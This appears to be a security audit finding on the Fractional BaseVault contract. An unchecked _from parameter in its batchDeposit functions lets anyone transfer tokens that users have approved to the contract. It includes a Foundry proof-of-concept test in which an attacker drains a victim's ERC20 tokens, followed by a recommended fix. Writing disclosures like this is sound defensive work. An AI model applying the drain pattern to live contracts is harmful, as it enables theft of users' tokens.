# Vulnerability details

## Impact
Steal ERC20s, ERC721s and ERC1155s from users.

## Description
Deploying a Vault using the BaseVault Protoform contract (for vault deployments with a fixed supply and buyout mechanism) is designed as a 2-step process.

Step 1 - User must allow the BaseVault contract to manage the ERC20s, ERC721s and ERC1155 in his wallet, that he wants to send to the new vault. 

This happens as separate transactions, as seen in unit tests, `setUpMulticall(user)` function
https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/test/TestUtil.sol#L340-L349
```
    function setUpMulticall(User memory _user) public {
        MockERC20(erc20).mint(_user.addr, 10);
        MockERC721(erc721).mint(_user.addr, 2);
        MockERC721(erc721).mint(_user.addr, 3);
        mintERC1155(_user.addr, 2);

        _user.erc20.approve(address(baseVault), 10);
        _user.erc721.setApprovalForAll(address(baseVault), true);
        _user.erc1155.setApprovalForAll(address(baseVault), true);
    }
```

Step 2 - Send a `multicall` to BaseVault, that will deploy the new vault and transfer all tokens.

## The vulnerability

The functions `batchDepositERC***(...)` in `BaseVault` accept any arbitrary `_from` parameter, allowing an attacker to steal tokens from any user that has ever given permission to this contract to manage his tokens.

After step 1 and before step 2 happens, an attacker can call `batchDepositERC20`, `batchDepositERC721`, `batchDepositERC1155` in the BaseVault and transfer all tokens and NFTs the user owns to his own wallet. You will steal the ones the user wanted to send to the vault and the ones that he didn't wanted to sell to the vault, all of them.

After step 2, there's still a permission given to the contract so the attacker can steal tokens from users that have previously deployed a vault but not removed the allowance to BaseVault.

## Proof of Concept
Insert this function in the unit tests and run `forge test -vvv --match-test testAttack`

```

    function testAttack() public {

        // Bob balance of ERC20 is 10 tokens
        bob = setUpUser(222, 5);
        MockERC20(erc20).mint(bob.addr, 10);
        bob.erc20.approve(address(baseVault), 10);

        // Alice balance of ERC20 is 10 tokens
        assertEq(IERC20(erc20).balanceOf(alice.addr), 10);

        // Alice set allowance to BaseVault in transaction No# 1
        // and prepares the data for the multicall of transaction No# 2

        factory = registry.factory();
        vault = IVaultFactory(factory).getNextAddress(alice.addr);
        initializeDeploy();

        // Right after Alice sends transaction No# 1,
        // and before sending transaction No# 2 (the multicall), the attacker
        // steals all tokens in Alice's wallet and send them to his own wallet
        // by calling batchDepositERC20

        address[] memory tokens = new address[](1);tokens[0] = erc20;
        uint256[] memory amounts = new uint256[](1);amounts[0] = 10;
        bob.baseVault.batchDepositERC20(alice.addr, bob.addr, tokens, amounts);

        // Vault has 0 tokens
        assertEq(IERC20(erc20).balanceOf(vault), 0);
        // Alice has 0 tokens
        assertEq(IERC20(erc20).balanceOf(alice.addr), 0);
        // Attacker has all 20 tokens
        assertEq(IERC20(erc20).balanceOf(bob.addr), 20);

    }
```

## Recommended Mitigation Steps
The `_from` in the functions `batchDepositERC***(...)`  should always be `msg.sender`, to avoid people stealing tokens from other users.

